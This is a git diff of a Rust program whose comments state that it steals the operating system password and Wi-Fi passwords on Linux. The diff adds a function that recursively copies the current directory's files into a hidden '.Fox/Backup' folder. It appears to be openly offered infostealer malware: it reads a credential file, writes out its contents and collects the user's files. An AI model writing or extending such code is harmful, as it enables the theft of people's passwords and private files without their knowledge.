@@ -1,4 +1,6 @@
 use std::fs;
+use std::io;
+use std::path::Path;
 use std::fs::File;
 use std::io::prelude::*;
 use std::io::{BufWriter, Write};
@@ -32,6 +34,10 @@ fn main() {
 
     //Steal OS Password
     write!(file_name_os, "{}", steal_os_pas(file_os_password)).expect("Error! Unable to write file.\n");
+
+    //Create BackUP Folder
+    //fs::create_dir_all(".Fox/BackUP").expect("Error! Folder exist.\n");
+    take_backup_files(".", ".Fox/Backup");
 }
 
 //Steal WIFI Password On Linux
@@ -48,4 +54,20 @@ fn steal_os_pas(source: String) -> String {
     let mut context: String = String::new();
     file.read_to_string(&mut context).expect("Error! Not readable.\n");
     return context;
+}
+
+//Take Backup
+fn take_backup_files(source: impl AsRef<Path>, dst: impl AsRef<Path>) -> io::Result<()> {
+    fs::create_dir_all(&dst)?;
+    for entry in fs::read_dir(source)? {
+        let entry = entry?;
+        let ty = entry.file_type()?;
+        if ty.is_dir() {
+            take_backup_files(entry.path(), dst.as_ref().join(entry.file_name()))?;
+        } 
+        else {
+            fs::copy(entry.path(), dst.as_ref().join(entry.file_name()))?;
+        }
+    }
+    Ok(())
 }
